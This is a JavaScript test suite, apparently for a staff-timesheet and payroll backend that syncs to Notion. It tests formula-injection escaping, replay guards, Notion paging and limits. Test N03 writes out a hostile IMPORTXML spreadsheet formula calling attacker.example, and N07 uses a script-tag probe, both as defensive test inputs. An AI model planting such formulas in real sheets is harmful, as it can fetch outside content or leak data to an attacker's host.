// Checks for the fixes added in PR #2 beyond the original 35 (new backend only,
// except where a check compares with the deployed one).
"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const { loadBackend } = require("../harness/gas");
const H = require("../harness/helpers");

const be = (opts) => loadBackend("new", opts);
const ids = (n, p = "abcdef12") => Array.from({ length: n }, (_, i) => p + "-entry-" + i);
const withIds = (entries, list) => entries.map((e, i) => Object.assign({}, e, { entryId: list[i] }));
const syncLog = (b) => b.sheet("Sync_Log").values().map((r) => r.slice(0, 7).join(" | ")).join("\n");

// ─── I1: formula injection ───────────────────────────────────
test("N01 I1: text starting with + - @ = is stored as plain text and comes back unchanged", () => {
  const b = be();
  const res = H.submit(b, [H.entry({ staffName: "=HYPERLINK(\"x\")", workVenue: "+WOW Mall", notes: "-30 min break", pic: "@Michael" })]);
  assert.equal(res.status, "success");
  const r = H.rowObj(b, 2);
  assert.equal(r.name, "=HYPERLINK(\"x\")");
  assert.equal(r.venue, "+WOW Mall");
  assert.equal(r.notes, "-30 min break");
  assert.equal(r.pic, "@Michael");
  assert.deepEqual(b.tab().formulas().map((f) => f.c), [13]);
  const s = H.status(b, "91234567").submissions[0];
  assert.equal(s.workVenue, "+WOW Mall");
});

test("N02 I1: on the deployed backend the same text shows #ERROR! (live check L2 model)", () => {
  const b = loadBackend("deployed");
  H.submit(b, [H.entry({ workVenue: "+WOW Mall", notes: "-30 min break" })]);
  assert.equal(H.rowObj(b, 2).venue, "#ERROR!");
  assert.equal(H.rowObj(b, 2).notes, "#ERROR!");
});

test("N03 I1: hostile names never become formulas on Dashboard, Staff_Directory, Job_Summary or Sync_Log", () => {
  const b = be();
  const evil = "=IMPORTXML(\"https://attacker.example\",\"//a\")";
  H.submit(b, [H.entry({ staffName: evil, workVenue: "-Mall" })]);
  H.approveViaDashboard(b, () => true, { projectNo: "P100", role: "Event Helper" });
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  H.runPayroll(b, ["2026-09"], "YES");
  for (const name of ["Dashboard", "Staff_Directory", "Job_Summary", "Sync_Log"]) {
    assert.deepEqual(b.sheet(name).formulas(), [], name + " has a formula");
  }
  assert.equal(H.fpsList(b)[0].name, evil);
});

// ─── D2: replay guard / partial write ────────────────────────
test("N04 D2: re-sending the same entryIds adds no rows and no email", () => {
  const b = be();
  const list = ids(2);
  const entries = withIds([H.entry({ dateOfWork: "2026-09-01" }), H.entry({ dateOfWork: "2026-09-02" })], list);
  const first = H.submit(b, entries);
  assert.equal(first.rowsAdded, 2);
  assert.deepEqual(first.alreadySaved, []);
  const again = H.submit(b, entries);
  assert.equal(again.status, "success");
  assert.equal(again.rowsAdded, 0);
  assert.deepEqual(again.alreadySaved, [1, 2]);
  assert.equal(b.tab().getLastRow(), 3);
  assert.equal(b.mail.length, 1);
});

test("N05 D2: after a part-way failure, a retry with the same ids writes only the missing jobs", () => {
  const b = be({ failAppendAt: 2 });
  const list = ids(3);
  const entries = withIds([1, 2, 3].map((d) => H.entry({ dateOfWork: "2026-09-0" + d })), list);
  const res = H.submit(b, entries);
  assert.equal(res.status, "error");
  assert.deepEqual(res.savedEntries, [1]);
  const retry = H.submit(b, entries);
  assert.equal(retry.status, "success");
  assert.deepEqual(retry.alreadySaved, [1]);
  assert.equal(retry.rowsAdded, 2);
  assert.deepEqual(H.rows(b).map((r) => r.date), ["2026-09-01", "2026-09-02", "2026-09-03"]);
  assert.deepEqual(retry.duplicates, []);   // the retried jobs are not flagged against job 1
});

test("N06 D2: requests without entryIds (old page) behave exactly as before", () => {
  const b = be();
  H.submit(b, [H.entry()]);
  const res = H.submit(b, [H.entry()]);
  assert.equal(res.rowsAdded, 1);
  assert.deepEqual(res.duplicates, [1]);
  assert.equal(b.tab().getLastRow(), 3);
});

test("N07 D2: a malformed entryId is ignored (treated as no id)", () => {
  const b = be();
  const e = Object.assign(H.entry(), { entryId: "<script>" });
  H.submit(b, [e]);
  H.submit(b, [e]);
  assert.equal(b.tab().getLastRow(), 3);
  assert.equal(b.cache.size, 0);
});

test("N08 D2: different jobs never share an id across staff (ids are per job)", () => {
  const b = be();
  H.submit(b, withIds([H.entry()], ["sharedid-1"]));
  const other = H.submit(b, withIds([H.entry({ phoneNumber: "61234567" })], ["otherid-22"]));
  assert.equal(other.rowsAdded, 1);
});

// ─── A1 / deploy safety ──────────────────────────────────────
test("N09 A1: every menu item and dialog callback points at a function that exists", () => {
  const b = be();
  b.ctx.onOpen();
  const items = b.ui.menus[0].items;
  assert.equal(items.length, 6);
  for (const it of items) assert.equal(typeof b.ctx[it.fn], "function", it.fn);
  H.addRow(b, { status: "Approved" });
  b.call("refreshPayroll");
  H.runPayroll(b, ["2026-09"]);                 // a payment list must exist for the Mark-as-Paid picker
  b.call("markApprovedAsPaid");
  b.call("syncToNotion");
  for (const d of b.ui.dialogs) {
    const m = d.html.match(/\["(\w+)"\]\(sel\)/);
    assert.ok(m, "dialog has a callback");
    assert.equal(typeof b.ctx[m[1]], "function", m[1]);
  }
  assert.deepEqual(b.ui.dialogs.map((d) => d.html.match(/\["(\w+)"\]/)[1]), ["runPayrollForMonths", "runMarkPaidBatch", "runSyncForMonths"]);
});

test("N10 A1: the response contract keeps status / rowsAdded / duplicates", () => {
  const res = H.submit(be(), [H.entry()]);
  assert.deepEqual(Object.keys(res).sort(), ["alreadySaved", "duplicates", "rowsAdded", "status"]);
});

// ─── L5: Project No. stays text ──────────────────────────────
test("N11 L5: Project No. 0123 keeps its leading zero and 2026-09 is not turned into a date", () => {
  for (const pn of ["0123", "2026-09"]) {
    const b = be();
    H.submit(b, [H.entry()]);
    H.approveViaDashboard(b, () => true, { projectNo: pn });
    assert.equal(H.rowObj(b, 2).projectNo, pn);
  }
  const old = loadBackend("deployed");
  H.submit(old, [H.entry()]);
  H.approveViaDashboard(old, () => true, { projectNo: "0123" });
  assert.equal(H.rowObj(old, 2).projectNo, 123);   // the problem L5 describes
});

// ─── P5: alert lists rows ────────────────────────────────────
test("N12 P5: Refresh Payroll lists every row with no usable Final Rate and Mark as Paid leaves it Approved", () => {
  const b = be();
  H.addRow(b, { status: "Approved", ot: "abc", dateOfWork: "2026-09-01" });
  H.addRow(b, { status: "Approved", dateOfWork: "2026-09-02" });
  H.runPayroll(b, ["2026-09"]);
  assert.ok(b.ui.alerts.some((a) => /fix row\(s\) 2 /.test(a)));
  assert.equal(H.fpsList(b)[0].amount, 800);
  H.markPaid(b, ["2026-09"]);
  assert.deepEqual(H.rows(b).map((r) => r.status), ["Approved", "Paid"]);
});

// ─── N1 / N2 / N3 / L6 / L8: Notion ──────────────────────────
function syncRow(b, o = {}) {
  return H.addRow(b, Object.assign({ status: "Approved", projectNo: "P100", role: "Event Helper" }, o));
}

test("N13 N1: links are read page by page when Notion pages the property (60 links, 25 per page)", () => {
  const b = be({ notion: { propPageSize: 25 } });
  const hp = b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  const crew = b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567", relations: Array.from({ length: 60 }, (_, i) => "old-" + i) });
  syncRow(b);
  b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.equal(b.notion.relations(crew).length, 61);
  assert.equal(b.notion.relations(crew)[60], hp);
  assert.equal(b.notion.calls.filter((c) => c.path.includes("/properties/")).length, 3);
});

test("N14 N1 / round 2 #6: at the 100-link limit NOTHING is written, the row stays unsynced with an ERROR and a note in P", () => {
  const b = be();
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  const old = Array.from({ length: 100 }, (_, i) => "old-" + i);
  const crew = b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567", relations: old, workLogParts: ["2026-08 │ x"] });
  const r = syncRow(b);
  const s = b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.deepEqual(b.notion.relations(crew), old);                 // nothing deleted
  assert.equal(b.notion.workLog(crew), "2026-08 │ x");             // no log line (would repeat on every retry)
  assert.equal(H.rowObj(b, r).synced, "");                         // NOT stamped
  assert.match(b.tab().peek(r, 16).note, /Not synced: .*100 job links/);
  assert.match(syncLog(b), /ERROR.*Not synced/);
  assert.equal(s.blocked, 1);
  // the PM sees it in the end-of-sync alert too
  b.call("runSyncForMonths", ["2026-09"]);
  assert.match(H.lastAlert(b), /1 row\(s\) NOT synced/);
  // once a link slot is free (PM archived links), the next sync goes through and clears the note
  b.notion.pages[crew].props["Jobs Assigned 派工記錄"].relation.pop();
  b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.match(String(H.rowObj(b, r).synced), /\(HKT\)$/);
  assert.equal(b.tab().peek(r, 16).note, "");
});

test("N15 N1: a job already linked is not linked twice", () => {
  const b = be();
  const hp = b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  const crew = b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567", relations: [] });
  syncRow(b, { dateOfWork: "2026-09-01" });
  syncRow(b, { dateOfWork: "2026-09-02" });
  b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.deepEqual(b.notion.relations(crew), [hp]);
  assert.equal(b.notion.workLog(crew).split("\n").length, 2);
});

test("N16 N2: a Work Log with more than 25 parts is read in full before appending", () => {
  const b = be();
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  const parts = Array.from({ length: 30 }, (_, i) => "line " + i + "\n");
  const crew = b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567", workLogParts: parts });
  syncRow(b);
  b.call("syncMonthlyToNotion", ["2026-09"]);
  const log = b.notion.workLog(crew);
  assert.match(log, /line 0\n/);
  assert.match(log, /line 29\n/);
  assert.match(log, /2026-09/);
});

test("N17 N2: a log over 100 × 2000 characters keeps the newest lines and stays within Notion's limits", () => {
  const b = be();
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  const line = "2026-01 │ Mall │ P1 │ $800/day ".padEnd(99, ".") + "\n";   // 100 chars
  const big = line.repeat(2100);                                               // 210,000 chars
  const parts = [];
  for (let i = 0; i < big.length; i += 2000) parts.push(big.slice(i, i + 2000));
  const crew = b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567", workLogParts: parts });
  const r = syncRow(b);
  b.call("syncMonthlyToNotion", ["2026-09"]);
  const after = b.notion.workLogParts(crew);
  assert.ok(after.length <= 100);
  assert.ok(after.every((p) => p.length <= 2000));
  const log = after.join("");
  assert.match(log, /^…\(older entries trimmed/);
  assert.match(log, /2026-09 │ — │ P100 │ \$800\/day$/);
  assert.notEqual(H.rowObj(b, r).synced, "");
});

test("N18 N2: emoji are never split across two text parts", () => {
  const b = be();
  const out = b.ctx._chunkText_("a" + "😀".repeat(1500), 2000);
  assert.equal(out.join(""), "a" + "😀".repeat(1500));
  for (const p of out) assert.doesNotMatch(p, /^[\uDC00-\uDFFF]|[\uD800-\uDBFF]$/);
});

test("N19 N3: column P is stamped right after the Work Log write (before any further Notion call)", () => {
  const b = be();
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567" });
  const r = syncRow(b);
  // Fail the NEXT Notion call after the work-log write: the row must already be stamped.
  const orig = b.notion.fetch.bind(b.notion);
  let logWritten = false, stampedAtNextCall = null;
  b.notion.fetch = (url, o) => {
    if (logWritten && stampedAtNextCall === null) stampedAtNextCall = String(H.rowObj(b, r).synced);
    const res = orig(url, o);
    if (o && o.payload && /Work Log/.test(o.payload)) logWritten = true;
    return res;
  };
  syncRow(b, { staffName: "Wong", phoneNumber: "61234567" });   // causes a further call
  b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.match(stampedAtNextCall, /\(HKT\)$/);
});

test("N20 N3: near the 6-minute limit the sync stops cleanly, leaves the rest unstamped and says so", () => {
  const b = be();
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  const r1 = syncRow(b);
  const r2 = syncRow(b, { staffName: "Wong", phoneNumber: "61234567" });
  b.ctx.RUN_START_MS_ = Date.now() - 6 * 60 * 1000;
  b.ui.responses.push("YES");                    // "Sync to Notion?" → YES
  b.call("runPayrollForMonths", ["2026-09"]);
  assert.equal(H.rowObj(b, r1).synced, "");
  assert.equal(H.rowObj(b, r2).synced, "");
  assert.match(syncLog(b), /Stopped early \(time limit\): 2 row\(s\)/);
  assert.match(H.lastAlert(b), /stopped early/);
  b.ctx.RUN_START_MS_ = Date.now();             // run again → finishes
  b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.notEqual(H.rowObj(b, r1).synced, "");
  assert.notEqual(H.rowObj(b, r2).synced, "");
});

test("N21 L8: a new person with two rows gets ONE Crew page, both links and both log lines, even with stale Notion reads", () => {
  const b = be();
  const hp1 = b.notion.addHiring({ title: "T1", projectNo: "P100", role: "Event Helper" });
  const hp2 = b.notion.addHiring({ title: "T2", projectNo: "P200", role: "Event Helper" });
  b.notion.freeze();                              // queries keep answering from before the sync
  syncRow(b, { dateOfWork: "2026-09-01" });
  syncRow(b, { dateOfWork: "2026-09-02", projectNo: "P200" });
  b.call("syncMonthlyToNotion", ["2026-09"]);
  const crews = b.notion.crewPages();
  assert.equal(crews.length, 1);
  assert.deepEqual(b.notion.relations(crews[0].id), [hp1, hp2]);
  assert.equal(b.notion.workLog(crews[0].id).split("\n").length, 2);
});

test("N22 L6: a Crew page saved as +852 9123 4567 is found (no duplicate Crew)", () => {
  for (const stored of ["+852 9123 4567", "9123-4567", "+85291234567", "9123 4567"]) {
    const b = be();
    b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
    const crew = b.notion.addCrew({ name: "Chan Tai Man", phone: stored });
    syncRow(b);
    b.call("syncMonthlyToNotion", ["2026-09"]);
    assert.equal(b.notion.crewPages().length, 1, stored);
    assert.equal(b.notion.relations(crew).length, 1, stored);
  }
});

test("N23 N: a failed Notion write leaves the row unstamped so the next sync retries it", () => {
  const b = be();
  b.notion.addHiring({ title: "T", projectNo: "P100", role: "Event Helper" });
  b.notion.addCrew({ name: "Chan Tai Man", phone: "91234567" });
  const r = syncRow(b);
  const orig = b.notion.fetch.bind(b.notion);
  b.notion.fetch = (url, o) => (o && o.method === "patch")
    ? { getResponseCode: () => 500, getContentText: () => "{\"message\":\"boom\"}" }
    : orig(url, o);
  b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.equal(H.rowObj(b, r).synced, "");
  assert.match(syncLog(b), /ERROR.*500/);
});

test("N24 Sync without NOTION_API_KEY logs an error and returns a summary", () => {
  const b = be({ notionKey: null });
  syncRow(b);
  const s = b.call("syncMonthlyToNotion", ["2026-09"]);
  assert.equal(s.errors, 1);
  assert.match(syncLog(b), /NOTION_API_KEY not set/);
});
